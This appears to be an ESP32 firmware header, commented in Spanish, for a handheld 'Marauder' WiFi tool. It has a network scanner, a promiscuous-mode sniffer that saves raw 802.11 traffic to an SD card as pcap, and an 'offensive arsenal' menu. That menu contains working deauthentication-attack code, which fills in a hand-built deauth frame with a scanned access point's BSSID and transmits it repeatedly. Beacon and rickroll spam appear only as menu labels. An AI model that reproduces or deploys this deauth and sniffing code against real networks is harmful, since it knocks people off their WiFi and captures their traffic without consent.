#ifndef APPMARAUDER_H
#define APPMARAUDER_H
#include "App.h"
#include "Emojis.h"
#include "ui/Launcher.h"
#include "config.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include <SD_MMC.h>

// --- ESTRUCTURAS PCAP (Estándar de Wireshark) ---
struct pcap_global_header {
    uint32_t magic_number = 0xa1b2c3d4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    int32_t  thiszone = 0;
    uint32_t sigfigs = 0;
    uint32_t snaplen = 65535;
    uint32_t network = 105; // 802.11
};

struct pcap_packet_header {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};

// --- BUFFER GLOBAL PARA SNIFFER (Previene crasheos en interrupciones) ---
#define PACKET_BUFFER_SIZE 2048
static uint8_t packet_buffer[PACKET_BUFFER_SIZE];
static volatile int packet_len = 0;
static volatile bool packet_ready = false;
static uint32_t paquetesCapturados = 0;

// Callback en crudo de ESP32 Marauder
static void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (packet_ready) return; // Si no hemos guardado el anterior, descartamos para no colapsar la RAM
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    if (len > PACKET_BUFFER_SIZE) len = PACKET_BUFFER_SIZE;
    memcpy(packet_buffer, pkt->payload, len);
    packet_len = len;
    packet_ready = true;
    paquetesCapturados++;
}

class AppMarauder : public App {
private:
    enum EstadoMenu { MENU_RAIZ, MENU_ESCANEO, MENU_SNIFFER, MENU_ATAQUE };
    EstadoMenu estadoActual = MENU_RAIZ;

    int indiceMenu = 0;
    String menuRaiz[3] = {"1. ESCANEAR (AP/STA)", "2. SNIFFER (PCAP)", "3. ATAQUES (DOS)"};
    String menuAtaque[3] = {"> DEAUTH OBJETIVO", "> BEACON SPAM", "> RICKROLL SPAM"};

    unsigned long ultimoMovimiento = 0;
    bool pantallaActualizada = false;
    bool btnAnterior = false;
    
    // Animación Neón
    int anguloNeon = 0;
    unsigned long ultimoFrameNeon = 0;

    // Variables de Red
    int redesEncontradas = 0;
    String ssids[15];
    uint8_t bssids[15][6];
    
    // Archivo PCAP
    File pcapFile;
    bool guardandoPcap = false;

    // Plantillas de ataque de Marauder
    uint8_t deauth_pkt[26] = {
        0xC0, 0x00, 0x3A, 0x01, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destino (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Origen
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, 0x07, 0x00 
    };

    void iniciarEscaneo() {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        redesEncontradas = WiFi.scanNetworks(false, true, false, 300);
        for(int i = 0; i < redesEncontradas && i < 15; i++) {
            ssids[i] = WiFi.SSID(i);
            uint8_t* mac = WiFi.BSSID(i);
            for(int j=0; j<6; j++) bssids[i][j] = mac[j];
        }
    }

    void iniciarSniffer() {
        paquetesCapturados = 0;
        packet_ready = false;
        WiFi.mode(WIFI_STA);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
        
        // 1. Asignar los pines correctos del lector trasero
        SD_MMC.setPins(SD_MMC_CLK, SD_MMC_CMD, SD_MMC_D0);
        
        // 2. Levantar la tarjeta en MODO 1-BIT (El parámetro 'true' es la clave)
        if (SD_MMC.begin("/sdcard", true)) {
            // Borrar archivo anterior si existe
            if (SD_MMC.exists("/captura.pcap")) SD_MMC.remove("/captura.pcap");
            
            pcapFile = SD_MMC.open("/captura.pcap", FILE_WRITE);
            if (pcapFile) {
                pcap_global_header gh;
                pcapFile.write((uint8_t*)&gh, sizeof(gh));
                guardandoPcap = true;
            } else {
                guardandoPcap = false;
            }
        } else {
            guardandoPcap = false; // Falló el montaje
        }
    }

    void detenerSniffer() {
        esp_wifi_set_promiscuous(false);
        if (pcapFile) {
            pcapFile.close();
        }
        if (guardandoPcap) {
            SD_MMC.end(); // Apagar el lector para ahorrar energía
            guardandoPcap = false;
        }
    }

    void guardarPaquetePendiente() {
        if (packet_ready && guardandoPcap && pcapFile) {
            pcap_packet_header ph;
            ph.ts_sec = millis() / 1000;
            ph.ts_usec = (millis() % 1000) * 1000;
            ph.incl_len = packet_len;
            ph.orig_len = packet_len;
            pcapFile.write((uint8_t*)&ph, sizeof(ph));
            pcapFile.write(packet_buffer, packet_len);
            pcapFile.flush(); // Asegurar escritura
        }
        packet_ready = false; // Liberar buffer
    }

    void dispararDeauth() {
        if (redesEncontradas > 0) {
            for(int i=0; i<6; i++) {
                deauth_pkt[10 + i] = bssids[0][i];
                deauth_pkt[16 + i] = bssids[0][i];
            }
            esp_wifi_80211_tx(WIFI_IF_STA, deauth_pkt, sizeof(deauth_pkt), false);
        }
    }

public:
    const char* obtenerNombre() override { return "MARAUDER CORE"; }
    const uint8_t* obtenerEmoji() override { return emoji_spammer; } // Icono Táctico
    
    void setup() override {}

    void alEntrar() override {
        estadoActual = MENU_RAIZ;
        indiceMenu = 0;
        anguloNeon = 0;
        ultimoFrameNeon = millis();
        ultimoMovimiento = millis();
        pantallaActualizada = false;
        btnAnterior = (digitalRead(JOY_SW) == LOW);
        neopixelWrite(LED_PIN, 0, 0, 0); 
    }
    
    void alSalir() override {
        detenerSniffer();
        WiFi.mode(WIFI_STA);
        neopixelWrite(LED_PIN, 0, 0, 0);
    }

    void loop(Arduino_Canvas* canvas) override {
        
        int valVert = joyEjeY_esVertical ? analogRead(JOY_Y) : analogRead(JOY_X);
        bool arriba = joyInvVertical ? (valVert > 3200) : (valVert < 800);
        bool abajo = joyInvVertical ? (valVert < 800) : (valVert > 3200);
        bool botonAhora = (digitalRead(JOY_SW) == LOW);
        bool clicSimple = (botonAhora && !btnAnterior);

        if (millis() - ultimoFrameNeon > 30) {
            anguloNeon = (anguloNeon + 8) % 360; 
            ultimoFrameNeon = millis();
            pantallaActualizada = false; 
        }

        // --- GESTIÓN DE GUARDADO ASÍNCRONO ---
        if (estadoActual == MENU_SNIFFER) {
            guardarPaquetePendiente(); // Guarda a la SD sin bloquear el joystick
        }

        // --- LÓGICA DE NAVEGACIÓN ---
        if (estadoActual == MENU_RAIZ || estadoActual == MENU_ATAQUE) {
            if (millis() - ultimoMovimiento > 200) {
                if (arriba) { indiceMenu--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo)  { indiceMenu++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (indiceMenu < 0) indiceMenu = 2;
                if (indiceMenu > 2) indiceMenu = 0;
            }
        }

        // --- GESTIÓN DE CLICS ---
        if (clicSimple) {
            if (estadoActual == MENU_RAIZ) {
                if (indiceMenu == 0) { estadoActual = MENU_ESCANEO; iniciarEscaneo(); }
                if (indiceMenu == 1) { estadoActual = MENU_SNIFFER; iniciarSniffer(); }
                if (indiceMenu == 2) { estadoActual = MENU_ATAQUE; indiceMenu = 0; }
            } 
            else if (estadoActual == MENU_ESCANEO || estadoActual == MENU_SNIFFER) {
                if (estadoActual == MENU_SNIFFER) detenerSniffer();
                estadoActual = MENU_RAIZ; indiceMenu = 0; neopixelWrite(LED_PIN, 0, 0, 0);
            }
            else if (estadoActual == MENU_ATAQUE) {
                // Si hace click dentro de ataque, vuelve al menu (por seguridad)
                estadoActual = MENU_RAIZ; indiceMenu = 0; neopixelWrite(LED_PIN, 0, 0, 0);
            }
            pantallaActualizada = false;
        }

        // --- RENDERIZADO VISUAL ---
        if (!pantallaActualizada) {
            canvas->fillScreen(BLACK);

            if (estadoActual == MENU_RAIZ || estadoActual == MENU_ATAQUE) {
                // NEÓN REPOSO/SELECCIÓN (CYAN)
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_BLUE); 
                
                String titulo = (estadoActual == MENU_RAIZ) ? "MARAUDER ENGINE" : "ARSENAL OFENSIVO";
                Launcher::dibujarTextoCentrado(canvas, titulo.c_str(), 40, 1, IRON_CYAN);
                canvas->drawLine(20, 50, 220, 50, IRON_DARK);

                for (int i = 0; i < 3; i++) {
                    int yPos = 80 + (i * 30);
                    uint16_t color = (i == indiceMenu) ? WHITE : IRON_BLUE;
                    if (i == indiceMenu) {
                        canvas->fillRoundRect(15, yPos - 12, 210, 24, 3, IRON_DARK);
                        canvas->fillTriangle(20, yPos-4, 20, yPos+4, 25, yPos, (estadoActual==MENU_ATAQUE) ? IRON_RED : IRON_CYAN);
                    }
                    String texto = (estadoActual == MENU_RAIZ) ? menuRaiz[i] : menuAtaque[i];
                    Launcher::dibujarTextoCentrado(canvas, texto.c_str(), yPos - 3, 1, color);
                }
            } 
            else if (estadoActual == MENU_ESCANEO) {
                canvas->drawCircle(120, 120, 118, IRON_GREEN);
                Launcher::dibujarTextoCentrado(canvas, "RECONOCIMIENTO", 40, 1, IRON_GREEN);
                canvas->drawLine(30, 50, 210, 50, IRON_DARK);
                
                char buf[32]; sprintf(buf, "APs Encontrados: %d", redesEncontradas);
                Launcher::dibujarTextoCentrado(canvas, buf, 65, 1, WHITE);

                for(int i=0; i<3 && i<redesEncontradas; i++) {
                    canvas->setCursor(40, 95 + (i*25));
                    canvas->setTextColor(IRON_CYAN); canvas->setTextSize(1);
                    canvas->print(ssids[i].substring(0, 15));
                }
                Launcher::dibujarTextoCentrado(canvas, "< Clic = Volver", 175, 1, IRON_DARK);
            }
            else if (estadoActual == MENU_SNIFFER) {
                neopixelWrite(LED_PIN, 0, 0, 255); // LED Azul (Modo Escucha)
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, WHITE); 
                
                Launcher::dibujarTextoCentrado(canvas, "SNIFFER (RAW 802.11)", 45, 1, IRON_CYAN);
                
                char buf[32]; sprintf(buf, "CAPTURADOS: %d", paquetesCapturados);
                Launcher::dibujarTextoCentrado(canvas, buf, 95, 2, WHITE);
                
                if (guardandoPcap) Launcher::dibujarTextoCentrado(canvas, "[Guardando en SD: captura.pcap]", 135, 1, IRON_GREEN);
                else Launcher::dibujarTextoCentrado(canvas, "[Advertencia: SD no detectada]", 135, 1, IRON_RED);

                Launcher::dibujarTextoCentrado(canvas, "< Clic = Detener", 175, 1, IRON_DARK);
            }

            // Ejecución Continua de Ataque (Si estamos en el submenú de ataque y es el seleccionado)
            if (estadoActual == MENU_ATAQUE && indiceMenu == 0) {
                neopixelWrite(LED_PIN, 255, 0, 0); // Led Rojo Fuego
                dispararDeauth(); 
                Launcher::dibujarTextoCentrado(canvas, "¡DISPARANDO DEAUTH!", 175, 1, IRON_RED);
            }

            canvas->flush();
            pantallaActualizada = true;
        }

        btnAnterior = botonAhora;
        delay(10);
    }
};
#endif